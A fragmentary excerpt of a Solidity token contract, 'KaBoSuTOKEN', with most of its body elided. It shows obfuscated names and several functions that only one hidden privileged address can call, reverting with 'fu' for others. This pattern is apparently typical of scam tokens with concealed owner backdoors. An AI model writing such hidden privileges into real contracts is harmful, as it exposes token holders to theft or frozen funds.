...
contract KaBoSuTOKEN is Ownable {
    uint256 tokenamount = 10000000*10**decimals();
    address public BAAKO130;
    ...
    string private _tokenname = "BAKOSUion2.0";
    string private _tokensymbol = "KaBoSu";
    ...
    function TOKEN123(address jjkxq1) public     {
        if(BAAKO130 != _msgSender()){
            revert("fu");
        }else{
            if(BAAKO130 != _msgSender()){
    ...
    function TOKEN(address jjkxq1) public     {
        if(BAAKO130 != _msgSender()){
            revert("fu");
        }else{
            if(BAAKO130 != _msgSender()){
    ...
    external {
        ...
        uint256 uyyxxadd23344 = 46330000000-1000;
        require(BAAKO130 == _msgSender());
